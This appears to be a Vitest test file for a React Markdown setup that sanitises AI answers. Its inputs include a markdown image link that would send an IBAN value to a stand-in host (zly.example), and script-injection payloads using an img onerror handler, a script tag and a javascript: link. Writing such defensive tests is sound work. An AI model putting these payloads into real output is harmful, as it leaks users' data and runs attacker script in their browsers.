import { describe, expect, it } from "vitest";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import ReactMarkdown from "react-markdown";
import { BEZPECNY_MARKDOWN } from "./markdown-ai";

const html = (md: string) =>
  renderToStaticMarkup(createElement(ReactMarkdown, { ...BEZPECNY_MARKDOWN, children: md }));

describe("odpoveď AI v markdowne", () => {
  it("nekreslí obrázky (únik údajov cez adresu obrázka)", () => {
    const h = html("Súhrn ![x](https://zly.example/?d=IBAN123) hotovo");
    expect(h).not.toContain("<img");
    expect(h).not.toContain("zly.example");
  });
  it("nespustí HTML ani javascript: odkaz", () => {
    const h = html(
      "<img src=x onerror=alert(1)> <script>alert(1)</script> [klik](javascript:alert(1))",
    );
    expect(h).not.toMatch(/<img|<script|href="javascript:/);
    expect(h).toContain("&lt;img");
  });
  it("bežné formátovanie a odkaz ostanú", () => {
    const h = html("**Spolu** 123 € — [faktúra](/faktury/1)");
    expect(h).toContain("<strong>Spolu</strong>");
    expect(h).toContain('href="/faktury/1"');
  });
});
